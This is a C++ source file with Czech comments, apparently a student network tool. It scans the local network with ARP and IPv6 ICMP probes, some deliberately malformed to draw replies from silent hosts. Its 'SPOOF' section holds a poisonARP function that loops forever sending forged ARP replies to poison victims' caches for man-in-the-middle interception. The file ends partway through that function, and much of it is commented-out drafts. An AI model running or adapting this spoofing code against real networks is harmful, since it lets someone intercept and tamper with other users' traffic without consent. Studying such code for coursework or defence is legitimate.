/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

/*
 * Hlavní zdroj pro převzaté kódy - http://www.pdbuchan.com/rawsock/rawsock.html
 *
 */

#include "pds-library.h"
#include "tree.h"
#include <pcap.h>
#include <arpa/inet.h>

#include <iostream>
#include <fstream>
#include <sstream>
//#include <string>

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>           // close()
//#include <string.h>           // strcpy, memset(), and memcpy()

#include <netdb.h>            // struct addrinfo
#include <sys/types.h>        // needed for socket(), uint8_t, uint16_t
#include <sys/socket.h>       // needed for socket()
#include <netinet/in.h>       // IPPROTO_RAW, INET_ADDRSTRLEN
#include <netinet/ip.h>       // IP_MAXPACKET (which is 65535)
#include <arpa/inet.h>        // inet_pton() and inet_ntop()
#include <sys/ioctl.h>        // macro ioctl is defined
#include <bits/ioctls.h>      // defines values for argument "request" of ioctl.
#include <net/if.h>           // struct ifreq
#include <linux/if_ether.h>   // ETH_P_ARP = 0x0806
#include <linux/if_packet.h>  // struct sockaddr_ll (see man 7 packet)
#include <net/ethernet.h>

#include <unistd.h>

#include <errno.h>            // errno, perror()

using namespace std;
int h = 0;
int l = 0;
T_NODE_PTR tree;

ofstream outputFile;

//################################################SCANNER###################################################################

/**
 * Funkce pro otevření požadovaného rozhraní.
 * @param interface - jmeno interface
 * @param secondPar - filter pro odchytávání
 **/ 
pcap_t* openInterface(char* interface, const char* secondPar)
{
	pcap_t* packetDesc;  					//packetDescriptor
  
    char errBuf[PCAP_ERRBUF_SIZE];
    
    uint32_t  srcip, netmask;
    struct bpf_program  bpf;


	//otevření zadaného interface
	/** 
	  * pcap_open_live - vestavěná funkce pro poslech na daném interface
	  * @param interface 
      * @param BUFSIZ  - maximální velikost packetu
      * @param promiskuitní mód (1 = true, 0 = false)
      * @param packet read timeout
	  * @param odložný prostor pro chybové zprávy
	  **/
	if((packetDesc = pcap_open_live(interface, BUFSIZ, 1, 120000, errBuf)) == NULL)
	{
		cerr<<"Nepovedlo se připojit na interface ->"<<endl;
		cerr<< "pcap_open_live() failed: " << errBuf << endl;
		return NULL;
	}

	//získání Ip adresy a masky
	if(pcap_lookupnet(interface, &srcip, &netmask, errBuf) < 0)
	{
		cerr<<"Nenalezena IP..."<<endl;
		cerr<< "pcap_lookupnet failed: " << errBuf << endl;
		return NULL;
	}

	// Vytvoření filtru
	if(pcap_compile(packetDesc, &bpf, (char*)secondPar, 0, netmask))
	{
		cerr<<"Nepovedlo se konvertovat paket"<<endl;
 		cerr<<"pcap_compile() failed: " <<pcap_geterr(packetDesc)<<endl;
		return NULL;
	} 

	// Nastavení filtru
	if(pcap_setfilter(packetDesc, &bpf) < 0)
	{
		cerr<<"Nelze nastavit filter"<<endl;
		cerr<<"pcap_setfilter() failed: " <<pcap_geterr(packetDesc)<<endl;
		return NULL;
	}

	cerr<<"Func: openInterface exit(succes)"<<endl;
	
	// Otevření souboru
//	outputFile.open(interface,ios::out | ios::trunc);
	
	return packetDesc;
}

/**
 * Funkce pro získání potřebných údajů o užívnaém rozhraní - IP adresy, MAC.
 * @param intInfo - ukazatel na strukturu pro uložení dat
 * @param interface - název rozhranní
 */
void getInterfaceInfo(INTERFACE_INFO* intInfo, char * interface)
{
	struct ifreq ifr;				// Struktura pro získání mac adresy
	int sd;							// Socket
	uint32_t senderIP, netmask;		// Proměnné pro masku a síť
	in_addr src_ip, src_netmask;	// Struktury pro masku a síť
	char errBuf[PCAP_ERRBUF_SIZE];
	
	// Uložení názvu interface
	strcpy(intInfo->interface, interface);
	
	// Vytvoření socketu.
	if ((sd = socket (AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
		perror ("Socket() chyba při získání socketu pro ioctl()!");
		exit(EXIT_FAILURE);
	}
	// Získání MAC adresy.
	memset (&ifr, 0, sizeof (ifr));
	snprintf (ifr.ifr_name, sizeof (ifr.ifr_name), "%s", interface);
	if (ioctl (sd, SIOCGIFHWADDR, &ifr) < 0) {
		perror ("ioctl() chyba při získávání MAC adreasy! ");
		exit(EXIT_FAILURE);
	}
	// Kopírování MAC adresy.
	memcpy(&intInfo->interfaceMac, ifr.ifr_hwaddr.sa_data, ETH_ADDR_LEN * sizeof (u_char));
	
	// Získání masky a adresy sítě (v4)
	if(pcap_lookupnet(interface, &senderIP, &netmask, errBuf) < 0)
	{
		cerr<<"Nenalezena IP..."<<endl;
		cerr<< "pcap_lookupnet failed: " << errBuf << endl;
		exit(EXIT_FAILURE);
	}
	
	src_ip.s_addr = senderIP;
	src_netmask.s_addr = netmask;
	// Nakopírování masky a adresy sítě
	inet_pton(AF_INET, inet_ntoa(src_ip),&intInfo->networkAddress);
	inet_pton(AF_INET, inet_ntoa(src_netmask),&intInfo->networkMask);
	
	// Získání počtu hostů
	// ##########################################################
	unsigned long network,hostmask,broadcast;
	network = ntohl(src_ip.s_addr) & ntohl(src_netmask.s_addr);		// Síť

	hostmask = ~ntohl(src_netmask.s_addr);		// Maska
	broadcast = network | hostmask;				// Broadcast
	
	intInfo->hosts = broadcast-network-1;		// Počet stanic
	// ##########################################################
	
//	printf("Broadcast    %s\n",my_ntoa(broadcast));
//	printf("Hosts        %s\n",my_ntoa(network+1));
//	printf("   to        %s\n",my_ntoa(broadcast-1));
//	printf("Host count   %d\n",broadcast-network-1);
	
	// IPv4
	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, interface, IFNAMSIZ-1);
	ioctl(sd, SIOCGIFADDR, &ifr);
	// Nakopírování adresy
	inet_pton(AF_INET,inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr),&intInfo->interfaceAdd);
	close (sd);		// Zavření socketu
		
	
    struct ifaddrs * ifAddrStruct=NULL;
    struct ifaddrs * ifa=NULL;
    void * tmpAddrPtr=NULL;
	int ipCount = 0;

    getifaddrs(&ifAddrStruct);

	// Získání adress daného interface
    for (ifa = ifAddrStruct; ifa != NULL; ifa = ifa->ifa_next) {
        if (!ifa->ifa_addr) {
            continue;
        }
		if(strcmp(ifa->ifa_name,interface) == 0)
			{
			// IPv4 - řešeno prozatím jinak
//			if (ifa->ifa_addr->sa_family == AF_INET) {
//				// is a valid IP4 Address
//				tmpAddrPtr=&((struct sockaddr_in *)ifa->ifa_addr)->sin_addr;
//				char addressBuffer[INET_ADDRSTRLEN];
//				inet_ntop(AF_INET, tmpAddrPtr, addressBuffer, INET_ADDRSTRLEN);
//				printf("%s IP Address %s\n", ifa->ifa_name, addressBuffer); 
//			} else 
			// Získání IPv6 adress
			if (ifa->ifa_addr->sa_family == AF_INET6) {
				// is a valid IP6 Address
				tmpAddrPtr=&((struct sockaddr_in6 *)ifa->ifa_addr)->sin6_addr;;
				if(ipCount == 0)
					inet_ntop(AF_INET6, tmpAddrPtr, intInfo->interfaceAddv6a, INET6_ADDRSTRLEN);
				else if (ipCount == 1)
					inet_ntop(AF_INET6, tmpAddrPtr, intInfo->interfaceAddv6b, INET6_ADDRSTRLEN);
				else
					inet_ntop(AF_INET6, tmpAddrPtr, intInfo->interfaceAddv6c, INET6_ADDRSTRLEN);
				ipCount++;
			} 			
		}
    }
    if (ifAddrStruct!=NULL) 
		freeifaddrs(ifAddrStruct);	
}

/**
 * Funkce pro otevření výstupního souboru.
 * @param file - název souboru
 */
void openFile(char* file)
{
	outputFile.open(file,ios::out | ios::trunc);
}

/**
 * Funkce pro převod adresy z binární reprezentace na string.
 * @param input - vstupní adresa v u_char
 * @return  - adresa v podobě stringu
 */
std::string createAddress(u_char * input)
{
	char tmp[3];
	std::string output;
	
	for(int i =0; i < 3; i++){
		sprintf(&tmp[0], "%d", input[i]);
		output += tmp;
		output += ".";
	}
	sprintf(&tmp[0], "%d", input[3]);
	output += tmp;

	return output;
}

/**
 * Funkce pro vytvoření ARP paketu pro skenování,
 * @param intInfo - struktura s informacemi o rozhraní
 * @param arpHdr - ukazatel na místo v paměti pro ARP hlavičku
 * @param ptr - ukazatel na paketu
 * @param datalen - délka 
 * @return 
 */
u_char* createARP(INTERFACE_INFO* intInfo,
				ARP_HEADER* arpHdr,
				u_char* ptr,
				ssize_t &datalen)
{
	ssize_t sizeofARP = sizeof(ARP_HEADER);
	//vytvoření místa v pamětu a namapování packetu na strukturu
	memset(ptr,0, sizeofARP);
	arpHdr = (ARP_HEADER*)ptr;
	datalen += sizeofARP;
	ptr += sizeofARP;

	arpHdr->htype = htons(1);
	arpHdr->ptype = htons(ETH_P_IP);
	arpHdr->hlen = ETH_ADDR_LEN;
	arpHdr->plen = IP_ADDR_LEN;
	arpHdr->oper = htons(ARP_REQUEST);
	
	// Kopírování adres
	memcpy(&arpHdr->sha, intInfo->interfaceMac, ETH_ADDR_LEN * sizeof (u_char));
	memcpy(&arpHdr->spa, intInfo->interfaceAdd, ETH_ADDR_LEN * sizeof (u_char));
	// Cílová MAC adresa je 00:00:00:00:00:00
	for(int i=0; i<6;i++)
		arpHdr->tha[i] = TARGET_MAC; 
	
	return ptr + sizeofARP;	
}

/**
 * Funkce pro skenování sítě pomocí ARP a ICMPv6. 
 * Ve funkci je vytvořen nový proces aby bylo možné odchytávat pakety již během posílání.
 * @param intInfo - struktura s informacemi o rozhraní
 * @param descriptor - ukazatel na paket
 */
void scanNetwork(INTERFACE_INFO* intInfo,pcap_t* descriptor)
{
	// Tvorba nového procesu
	pid_t pid = fork();
	
	if(pid < 0)
	{
		cerr<<"Fork() Error!"<<endl;
		exit(EXIT_FAILURE);
	}
	else if (pid == 0)
	{
		// Zasílání skenovacích paketů
		usleep(1000000);
		scanIPv4(intInfo);
		cerr<<"Scan IPv4 rozeslán."<<endl;
		scanIPv6(intInfo,false);
		scanIPv6(intInfo,true);
		cerr<<"Scan IPv6 rozselán."<<endl;
//		ARPSniffer(descriptor, (pcap_handler)parsePacket);
		exit(EXIT_SUCCESS);
	}
	else
	{
		treeInit(&tree);	// Inicializace stromu
		// Odchytávání potřebných paketů
		ARPSniffer(descriptor, (pcap_handler)parsePacket);
		// Zrušení stromu
		dispose(&tree);
	}
}

/**
 * Funkce pro vytvoření a zaslání všechn ptřebných ARP paketů do sítě. 
 * Ze získané adresy sítě a počtu hostů jsou zasílány pakety všem.
 * @param intInfo - struktura s informacemi o rozhraní
 */
void scanIPv4(INTERFACE_INFO* intInfo)
{
	u_char packetPtr[sizeof(ARP_HEADER)];
	ARP_HEADER* arpHdr = NULL;
	ssize_t datalen = 0;
	createARP(intInfo, arpHdr,packetPtr,datalen);
	
	int sockfd;
	unsigned long dst_ip;
	
	sockaddr_in src_address;
	sockaddr_in dst_address;
	memset(&src_address, 0, sizeof(src_address));
	memset(&dst_address, 0, sizeof(dst_address));
	
	src_address.sin_port = htons(520);
	src_address.sin_family = AF_INET;
	//src_address.sin_addr.s_addr = INADDR_ANY;
	
	//vytvoření cílové adresy a portu
	dst_address.sin_port = htons(520);
	dst_address.sin_family = AF_INET;
	
	inet_pton(AF_INET,createAddress(intInfo->interfaceAdd).c_str(),&src_address.sin_addr);
	inet_pton(AF_INET,createAddress(intInfo->networkAddress).c_str(),&dst_address.sin_addr);
	
	dst_ip = ntohl(dst_address.sin_addr.s_addr);
	
	// Vytvoření socketu.
	if ((sockfd = socket (AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
		perror ("Socket() chyba při získání socketu pro ioctl()!");
		exit(EXIT_FAILURE);
	}

	usleep(1000000);
	cerr<<intInfo->hosts<<endl;
	int i;
	for(i = 1; i <= intInfo->hosts; i++)
	{
		dst_ip = ntohl(dst_address.sin_addr.s_addr);

		inet_pton(AF_INET, myNtoa(dst_ip+1),&dst_address.sin_addr);
		//bind socketu
		if(bind(sockfd, (struct sockaddr *)&src_address, sizeof(src_address)) < 0)
		{
			cerr <<"Bind() error"<< endl;
			exit(EXIT_FAILURE);
		}

		//odeslání packetu
		if(sendto(sockfd,
				  packetPtr,
				  datalen, 
				  0,
				  (struct sockaddr *)&dst_address,
				  sizeof(dst_address)) != datalen)
		{
			cerr << "Sendto() error"<< endl;
			exit(EXIT_FAILURE);
		}
	}
	close(sockfd);
}

/**
 * Funkce pro zaslání ping paketů pro sken IPv6 zařízení.
 * Ne všechny zařízení na PING odpoví, proto je zavedena druhá verze paketu s vadným paketem.
 * V případě malform paketu je zaslán poškozený paket, na který odpoví zařízení pomocí ICMPv6.
 * @param intInfo - struktura s informacemi o rozhraní
 * @param malform - příznak, zda paket má být požkozen nebo ne
 */
void scanIPv6(INTERFACE_INFO* intInfo, bool malform)
{
	// #####################################################################x
	int datalen, frame_length, sendsd;
	struct ip6_hdr send_iphdr;
	struct icmp6_hdr send_icmphdr;
	uint8_t *data, *dst_mac, *send_ether_frame;
	struct sockaddr_ll device;

	// Allocate memory for various arrays.
	dst_mac = allocate_ustrmem (6);
	data = allocate_ustrmem (IP_MAXPACKET);
	send_ether_frame = allocate_ustrmem (IP_MAXPACKET);

	// Submit request for a socket descriptor to look up interface.
	// We'll use it to send packets as well, so we leave it open.
	if ((sendsd = socket (PF_PACKET, SOCK_RAW, htons (ETH_P_ALL))) < 0) {
		perror ("socket() failed to get socket descriptor for using ioctl() ");
		exit (EXIT_FAILURE);
	}

	// Find interface index from interface name and store index in
	// struct sockaddr_ll device, which will be used as an argument of sendto().
	memset (&device, 0, sizeof (device));
	if ((device.sll_ifindex = if_nametoindex (intInfo->interface)) == 0) {
		perror ("if_nametoindex() failed to obtain interface index ");
		exit (EXIT_FAILURE);
	}

	// Set destination MAC address: you need to fill these out
	dst_mac[0] = 0x33;
	dst_mac[1] = 0x33;
	dst_mac[2] = 0x00;
	dst_mac[3] = 0x00;
	dst_mac[4] = 0x00;
	dst_mac[5] = 0x01;

	// Fill out sockaddr_ll.
	device.sll_family = AF_PACKET;
	memcpy (device.sll_addr, intInfo->interfaceMac, 6 * sizeof (uint8_t));
	device.sll_halen = 6;

	// ICMP data
	datalen = 4;
	data[0] = 'T';
	data[1] = 'e';
	data[2] = 's';
	data[3] = 't';

	// IPv6 header
//	fillIPv6hdr(intInfo, send_iphdr, datalen);
	// IPv6 version (4 bits), Traffic class (8 bits), Flow label (20 bits)
	send_iphdr.ip6_flow = htonl ((6 << 28) | (0 << 20) | 0);
	// Hop limit (8 bits): default to maximum value
	send_iphdr.ip6_hops = 255;
	// Source IPv6 address (128 bits)
	inet_pton (AF_INET6, intInfo->interfaceAddv6a, &(send_iphdr.ip6_src));
	// Destination IPv6 address (128 bits)
	inet_pton (AF_INET6, "ff02::1", &(send_iphdr.ip6_dst));

	
	if(malform){
		// Payload length (16 bits): ICMP header + ICMP data
		send_iphdr.ip6_plen = htons (32);
		send_iphdr.ip6_nxt = 0;
		
		hop_hdr hophdr;
		hophdr.nxt_hdr = IPPROTO_ICMPV6;
		hophdr.hdr_len = 1;
		
		u_char hop_opt[MALFORMED_SIZE];
		hop_opt[0] = 0x80;
		hop_opt[1] = 0x01;
		hop_opt[2] = 0x7f;
		hop_opt[3] = 0x1b;
		hop_opt[4] = 0x7f;
		hop_opt[5] = 0x1b;
		hop_opt[6] = 0x7f;
		hop_opt[7] = 0x1b;
		hop_opt[8] = 0x00;
		hop_opt[9] = 0x00;
		hop_opt[10] = 0x00;
		hop_opt[11] = 0x00;
		hop_opt[12] = 0x00;
		hop_opt[13] = 0x00;
		hop_opt[14] = 0x80;
		hop_opt[15] = 0x00;
		hop_opt[16] = 0xcf;
		hop_opt[17] = 0x34;
		hop_opt[18] = 0xde;
		hop_opt[19] = 0xad;
		hop_opt[20] = 0xbe;
		hop_opt[21] = 0xef;
		hop_opt[22] = 0x80;
		hop_opt[23] = 0x01;
		hop_opt[24] = 0x7f;
		hop_opt[25] = 0x1b;
		hop_opt[26] = 0x7f;
		hop_opt[27] = 0x1b;
		hop_opt[28] = 0x7f;
		hop_opt[29] = 0x1b;
		
		
		frame_length = 0;
		// Copy destination and source MAC addresses to ethernet frame.
		memcpy (send_ether_frame, dst_mac, 6 * sizeof (uint8_t));
		memcpy (send_ether_frame + 6, intInfo->interfaceMac, 6 * sizeof (uint8_t));
		
		// Next is ethernet type code (ETH_P_IPV6 for IPv6).
		// http://www.iana.org/assignments/ethernet-numbers
		send_ether_frame[12] = ETH_P_IPV6 / 256;
		send_ether_frame[13] = ETH_P_IPV6 % 256;
		frame_length += ETH_HDRLEN;
		
		// Copy IPv6 header to ethernet frame.
		memcpy (send_ether_frame + frame_length, &send_iphdr, IP6_HDRLEN * sizeof (uint8_t));
		frame_length += IP6_HDRLEN;
		// Copy hop-by-hop extension header (without options) to ethernet frame.
		memcpy (send_ether_frame + frame_length, &hophdr, HOP_HDRLEN * sizeof (uint8_t));
		frame_length += HOP_HDRLEN;
		
		memcpy (send_ether_frame + frame_length, &hop_opt, MALFORMED_SIZE * sizeof (u_char));
		frame_length += MALFORMED_SIZE;
	}
	else{
		// Payload length (16 bits): ICMP header + ICMP data
		send_iphdr.ip6_plen = htons (ICMP_HDRLEN + datalen);
		send_iphdr.ip6_nxt = IPPROTO_ICMPV6;		
		// ICMP header
		// Message Type (8 bits): echo request
		send_icmphdr.icmp6_type = ICMP6_ECHO_REQUEST;
		// Message Code (8 bits): echo request
		send_icmphdr.icmp6_code = 0;
		// Identifier (16 bits): usually pid of sending process - pick a number
		send_icmphdr.icmp6_id = htons (1000);
		// Sequence Number (16 bits): starts at 0
		send_icmphdr.icmp6_seq = htons (0);
		// ICMP header checksum (16 bits): set to 0 when calculating checksum
		send_icmphdr.icmp6_cksum = 0;
		send_icmphdr.icmp6_cksum = icmp6_checksum (send_iphdr, send_icmphdr, data, datalen);
		

		// Fill out ethernet frame header.
		// Ethernet frame length = ethernet header (MAC + MAC + ethernet type) + ethernet data (IP header + ICMP header + ICMP data)
		frame_length = 6 + 6 + 2 + IP6_HDRLEN + ICMP_HDRLEN + datalen;
		// Destination and Source MAC addresses
		memcpy (send_ether_frame, dst_mac, 6 * sizeof (uint8_t));
		memcpy (send_ether_frame + 6, intInfo->interfaceMac, 6 * sizeof (uint8_t));

		// Next is ethernet type code (ETH_P_IPV6 for IPv6).
		// http://www.iana.org/assignments/ethernet-numbers
		send_ether_frame[12] = ETH_P_IPV6 / 256;
		send_ether_frame[13] = ETH_P_IPV6 % 256;

		// Next is ethernet frame data (IPv6 header + ICMP header + ICMP data).
		// IPv6 header
		memcpy (send_ether_frame + ETH_HDRLEN, &send_iphdr, IP6_HDRLEN * sizeof (uint8_t));
		// ICMP header
		memcpy (send_ether_frame + ETH_HDRLEN + IP6_HDRLEN, &send_icmphdr, ICMP_HDRLEN * sizeof (uint8_t));
		// ICMP data
		memcpy (send_ether_frame + ETH_HDRLEN + IP6_HDRLEN + ICMP_HDRLEN, data, datalen * sizeof (uint8_t));
	}

		// Send ethernet frame to socket.
	if (sendto (sendsd, send_ether_frame, frame_length, 0, (struct sockaddr *) &device, sizeof (device)) <= 0) {
		perror ("sendto() failed ");
		exit (EXIT_FAILURE);
	}		
//	cerr<<"Odesláno"<<endl;
	free(send_ether_frame);
	free(dst_mac);
	free(data);
}

/**
 * Funkce pro odchytávání ARP paketů pro sken.
 * @param descriptor - ukazatle na paketu
 * @param func - funkce pro zpracování paketů
 **/ 
void ARPSniffer(pcap_t* descriptor, pcap_handler func)
{
	cerr<<"Odchytávání odpovědí..."<<endl;
		
	// Nastavení směru
	pcap_setdirection(descriptor,PCAP_D_IN);
//	spcap_set_timeout(descriptor,10);
	
	//funkce pro chytání packetů - 2 minuty timeout
	if(pcap_dispatch(descriptor, -1, func, NULL) < 0)
	{
		cerr << "pcap_loop() failed: " << pcap_geterr(descriptor)<<endl;
		return;
	}
	
	outputFile<<"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n";
	outputFile<<"<devices>\n";
	printTree(tree, outputFile);
	outputFile<<"</devices>\n";
	outputFile.close();
	
	cerr<<"Func: capturePacket exit(succes)"<<endl;
	cerr<<"Celkem ARP paketů: "<<l<<endl;
	cerr<<"Celkem ICMP paketů: "<<h<<endl;
	
	
}


/**
 * Funkce pro zpracování paketů.
 * @param 
 * @param 
 * @param packetptr - ukazatel na paket
 */
void parsePacket(u_char *, struct pcap_pkthdr *, u_char *packetptr)
{
	char errbuf[PCAP_ERRBUF_SIZE];		// Error buffer
	ARP_HEADER *arpheader = NULL;       // Ukazatel na ARP hlavičku
	arpheader = (ARP_HEADER *) malloc (sizeof (ARP_HEADER));
    memset (arpheader, 0,sizeof (ARP_HEADER));
	memset(errbuf,0,PCAP_ERRBUF_SIZE); 
	
	struct ether_header* etHdr;
	struct ip6_hdr* ip6Hdr;
	
	etHdr = (struct ether_header*)packetptr;

	
	switch(ntohs(etHdr->ether_type)){
		// ARP
		case ETHERTYPE_ARP:
			l++;
			arpheader = (struct arphdr_def *)(packetptr+ETH_HDRLEN);	// Namapování ARP hlavičky
			if(ntohs(arpheader->oper) == ARP_REPLY)
			{
				u_char *tmpMAC = arpheader->sha;
				u_char *tmpIP = arpheader->spa;
				// Vložení zpracovaných údajů do stromu
				insert(&tree,tmpMAC,tmpIP);
			}
		// IPv	
		case ETHERTYPE_IPV6:
			ip6Hdr = (struct ip6_hdr*)(packetptr+ETH_HDRLEN);
			if(ip6Hdr->ip6_ctlun.ip6_un1.ip6_un1_nxt == IPPROTO_ICMPV6)
			{
				h++;
				char ipv6_src[INET6_ADDRSTRLEN];
				char ipv6_dst[INET6_ADDRSTRLEN];
				inet_ntop(AF_INET6, &(ip6Hdr->ip6_src), ipv6_src, INET6_ADDRSTRLEN);
				inet_ntop(AF_INET6, &(ip6Hdr->ip6_dst), ipv6_dst, INET6_ADDRSTRLEN);

				// Vložení zpracovaných údajů do stromu
				insert(&tree,(u_char*)etHdr->ether_shost, ipv6_src);
			}
	}
}


/**
 * Funkce pro vypsání MAC adresy.
 * @param mac - MAC adresa
 */
void printMAC(u_char * mac)
{
//	cerr<<"MAC adresa užívaného rozhranní:";
	for(int i = 0; i < 5; i++)
		fprintf (stderr,"%02x:", mac[i]);
	fprintf (stderr,"%02x", mac[5]);
}

/**
 * Funkce pro vypsání IPv4 adresy.
 * @param ip - IPv4 adresa
 */
void printIP(u_char * ip)
{
	cerr<<"IP adresa užívaného rozhranní:";
	for(int i = 0; i < 3; i++)
		fprintf (stderr,"%d.", ip[i]);
	fprintf (stderr,"%d\n", ip[3]);
}
//##################################################SPOOF#########################################################################

void poisonARP(INTERFACE_INFO* intInfo, int time, char* mac1, char* mac2, char* ip1, char* ip2)
{
	ARP_HEADER arphdr;
	struct ethhdr* ethHdr = NULL;
//	uint8_t* ether_frame = allocate_ustrmem (IP_MAXPACKET);
	ssize_t datalen = 0;
	int sockfd;
	sockaddr_in src_address;
	sockaddr_in dst_address;
	memset(&src_address, 0, sizeof(src_address));
	memset(&dst_address, 0, sizeof(dst_address));
	
	// Vytvoření adress
	src_address.sin_port = htons(520);
	src_address.sin_family = AF_INET;
	//src_address.sin_addr.s_addr = INADDR_ANY;

	//vytvoření cílové adresy a portu
	dst_address.sin_port = htons(520);
	dst_address.sin_family = AF_INET;
	
	
	// Submit request for a raw socket descriptor.
	if ((sockfd = socket (PF_PACKET, SOCK_RAW, htons (ETH_P_ALL))) < 0) {
		perror ("socket() failed ");
		exit (EXIT_FAILURE);
	}
	
	// Průběžné posílání otrávených paketů
	while(1){
//		u_char packetPtr[sizeof(ARP_HEADER)];
//		datalen = 0;
////		u_char packetPtr[sizeof(ARP_HEADER)];
////		ARP_HEADER* arpHdr = NULL;
////		int sockfd;
//		
//		// Vytvoření socketu.
//		if ((sockfd = socket (AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
//			perror ("Socket() chyba při získání socketu pro ioctl()!");
//			exit(EXIT_FAILURE);
//		}
//
//
//		inet_pton(AF_INET,ip2,&src_address.sin_addr);
//		inet_pton(AF_INET,ip1,&dst_address.sin_addr);
//		
//		cerr<<"Odeslat z: "<<inet_ntoa(src_address.sin_addr)<<endl;
//		cerr<<"Odeslat na: "<<inet_ntoa(dst_address.sin_addr)<<endl;
//		
//		// Vytvoření ARP me->victim1
//		createPoisonARP(ethHdr,arpHdr,packetPtr,datalen,intInfo->interfaceMac,ip2,mac1,ip1,mac2);
//		
//		u_char *newDstMac = (u_char*)malloc(6*sizeof(u_char));
//		memset (newDstMac, 0xff, 6 * sizeof (uint8_t));
////		createMacAdress(newDstMac,mac1);		
//		
//		printMAC(newDstMac);
//		cerr<<"#"<<endl;
//		
////		memset (newDstMac, 0xff, 6 * sizeof (uint8_t));
//		
//		// Destination and Source MAC addresses
//		memcpy (ether_frame, newDstMac, 6*sizeof(uint8_t));
//		memcpy (ether_frame + 6, intInfo->interfaceMac, 6 * sizeof (uint8_t));
//		
//		// Next is ethernet type code (ETH_P_ARP for ARP).
//		ether_frame[12] = ETH_P_ARP / 256;
//		ether_frame[13] = ETH_P_ARP % 256;
//		
//		datalen += 14;
//
//		// ARP header
//		memcpy (ether_frame + ETH_HDRLEN, &arpHdr, 28 * sizeof (uint8_t));		
////		cerr<<ether_frame[28]<<endl;
////		
////		//bind socketu
////		if(bind(sockfd, (struct sockaddr *)&src_address, sizeof(src_address)) < 0)
////		{
////			cerr <<"Bind() error"<< endl;
////			exit(EXIT_FAILURE);
////		}		
//		cerr<<datalen<<endl;
//		
//		
//
//		struct sockaddr_ll device;
//		if ((device.sll_ifindex = if_nametoindex ("wlo1")) == 0)
//		{
//			printf("if_nametoindex() failed to obtain interface index ");
//				exit (EXIT_FAILURE);
//		}
////		printf ("Index for interface %s is %i\n", "eth0", device.sll_ifindex);
//		device.sll_family = AF_INET;
//		device.sll_halen = htons (6);		
//		
//		
//		//odeslání packetu
//		if(sendto(sockfd,
//				  ether_frame,
//				  datalen, 
//				  0,
//				  (struct sockaddr *)&device,
//				  sizeof(device)) != datalen)
//		{
//			cerr<<errno<<endl;
//			perror("ha");
//			cerr << "Sendto() error"<< endl;
//			exit(EXIT_FAILURE);
//		}
//		cerr<<"Odesláno"<<endl;
		
		// Vytvoření ARP me->victim2
//		createPoisonARP(arpHdr,packetPtr,datalen,intInfo->interfaceMac,ip1,mac2,ip2);
//		inet_pton(AF_INET,ip2,&dst_address.sin_addr);
//		
//		//odeslání packetu
//		if(sendto(sockfd,
//				  packetPtr,
//				  datalen, 
//				  0,
//				  (struct sockaddr *)&dst_address,
//				  sizeof(dst_address)) != datalen)
//		{
//			cerr << "Sendto() error"<< endl;
//			exit(EXIT_FAILURE);
//		}
		
		
		// Navrácení zpět
//		createPoisonARP(arpHdr,packetPtr,datalen,mac1,ip1,mac2,ip2);
//		inet_pton(AF_INET,ip2,&dst_address.sin_addr);
//		
//		//odeslání packetu
//		if(sendto(sockfd,
//				  packetPtr,
//				  datalen, 
//				  0,
//				  (struct sockaddr *)&dst_address,
//				  sizeof(dst_address)) != datalen)
//		{
//			cerr << "Sendto() error"<< endl;
//			exit(EXIT_FAILURE);
//		}		
		
		
		
		int i, status, datalen, sd, bytes;
//		char *interface, *target, *src_ip;
		uint8_t *src_mac, *dstMac, *ethFrame;
		struct addrinfo hints, *res;
		struct sockaddr_in *ipv4;
		struct sockaddr_ll device;
//		struct ifreq ifr;

		// Allocate memory for various arrays.
		src_mac = allocate_ustrmem (ETH_ADDR_LEN);
		dstMac = allocate_ustrmem (ETH_ADDR_LEN);
		ethFrame = allocate_ustrmem (IP_MAXPACKET);
		
		 
		 
		 createMacAdress(dstMac,mac1);
		 
		 

		 // Fill out hints for getaddrinfo().
		 memset (&hints, 0, sizeof (struct addrinfo));
		 hints.ai_family = AF_INET;
		 hints.ai_socktype = SOCK_STREAM;
		 hints.ai_flags = hints.ai_flags | AI_CANONNAME;

//		 memcpy(&arphdr.spa,intInfo->interfaceAdd,4);
		 inet_pton(AF_INET, ip1,&arphdr.tpa);
		 inet_pton(AF_INET, ip2,&arphdr.spa);
		 
		memset (&device, 0, sizeof (device));
		if ((device.sll_ifindex = if_nametoindex (intInfo->interface)) == 0) {
		  perror ("if_nametoindex() failed to obtain interface index ");
		  exit (EXIT_FAILURE);
		}
		printf ("Index for interface %s is %i\n", intInfo->interface, device.sll_ifindex);

		 

		 // Resolve target using getaddrinfo().
		 if ((status = getaddrinfo (ip1, NULL, &hints, &res)) != 0) {
		   fprintf (stderr, "getaddrinfo() failed: %s\n", gai_strerror (status));
		   exit (EXIT_FAILURE);
		 }
		 ipv4 = (struct sockaddr_in *) res->ai_addr;
		 memcpy (&arphdr.tha, &ipv4->sin_addr, 4 * sizeof (uint8_t));
		 freeaddrinfo (res);

		 // Fill out sockaddr_ll.
		 device.sll_family = AF_PACKET;
		 memcpy (device.sll_addr, intInfo->interfaceMac, 6 * sizeof (uint8_t));
		 device.sll_halen = 6;

		 // ARP header
		createMacAdress(arphdr.tha,mac1);
		 // Hardware type (16 bits): 1 for ethernet
		 arphdr.htype = htons (1);

		 // Protocol type (16 bits): 2048 for IP
		 arphdr.ptype = htons (ETH_P_IP);

		 // Hardware address length (8 bits): 6 bytes for MAC address
		 arphdr.hlen = ETH_ADDR_LEN;

		 // Protocol address length (8 bits): 4 bytes for IPv4 address
		 arphdr.plen = IP_ADDR_LEN;

		 // OpCode: 1 for ARP request
		 arphdr.oper = htons (ARP_REPLY);

		 // Sender hardware address (48 bits): MAC address
		 memcpy (&arphdr.sha, intInfo->interfaceMac, ETH_ADDR_LEN * sizeof (uint8_t));


		 // Ethernet frame length = ethernet header (MAC + MAC + ethernet type) + ethernet data (ARP header)
		 datalen = ETH_HDRLEN + ARP_HDR_LEN;

		 // Destination and Source MAC addresses
		 memcpy (ethFrame, dstMac, ETH_ADDR_LEN * sizeof (uint8_t));
		 memcpy (ethFrame + ETH_ADDR_LEN, intInfo->interfaceMac, ETH_ADDR_LEN * sizeof (uint8_t));

